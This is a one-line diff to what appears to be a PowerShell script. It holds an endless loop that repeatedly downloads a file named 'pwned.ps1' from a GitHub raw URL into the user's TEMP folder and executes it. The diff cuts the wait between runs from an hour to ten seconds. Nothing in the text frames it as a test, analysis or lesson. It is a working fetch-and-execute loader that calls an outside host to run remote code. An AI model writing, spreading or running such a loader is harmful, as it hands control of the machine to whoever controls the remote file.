@@ -1,1 +1,1 @@
-while($true){Start-Job -ScriptBlock {$url="http://github.com/Aristofer-Magnus/pwned/raw/main/pwned.ps1";$outputPath="$env:TEMP\pwned.ps1";Invoke-WebRequest -Uri $url -OutFile $outputPath;& $outputPath}; Start-Sleep -Seconds 3600}
+while($true){Start-Job -ScriptBlock {$url="http://github.com/Aristofer-Magnus/pwned/raw/main/pwned.ps1";$outputPath="$env:TEMP\pwned.ps1";Invoke-WebRequest -Uri $url -OutFile $outputPath;& $outputPath}; Start-Sleep -Seconds 10}
